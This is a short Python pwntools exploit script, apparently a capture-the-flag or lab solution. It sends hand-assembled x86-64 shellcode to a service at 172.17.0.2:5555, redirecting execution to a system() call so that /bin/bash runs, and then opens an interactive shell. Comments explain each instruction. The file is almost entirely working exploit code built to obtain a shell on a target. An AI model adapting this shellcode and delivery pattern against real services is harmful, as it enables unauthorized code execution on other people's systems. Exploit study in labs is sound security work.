from pwn import *


def main():

    # shellcode explanation:
    #
    # RAX points to our the payload we are sending. The idea is to substitute the first argument to "system" with
    # an address pointing to the payload we are sending.
    # so we take RAX (points to the start of the payload we send), copy it to RDI (first argument), add 16 bytes to it
    # push the address of the call to "system" to the stack, return (will jump execution to that address).
    #
    # mov rdi, rax     48 89 C7
    # add rdi, 0x10    48 83 C7 10
    # push 0x400663    68 63 06 40 00
    # ret              C3
    #
    # shellcode is 13 bytes long so we add 3 irrelevant bytes (0x90) to allign to 16 bytes
    # then we add the command we want to execute (/bin/bash) followed by a string termination char and
    # followed by a whitespace char (newline) that will stop "scanf" to read input and continue.

    shellcode = "\x48\x89\xC7\x48\x83\xC7\x10\x68\x63\x06\x40\x00\xC3" +\
                "\x90\x90\x90" +\
                "\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x00" +\
                "\x0a"
    conn = remote('172.17.0.2', 5555)
    conn.send(shellcode)
    info("payload sent. /bin/bash should be executed..")
    conn.interactive()


if __name__ == '__main__':
    main()

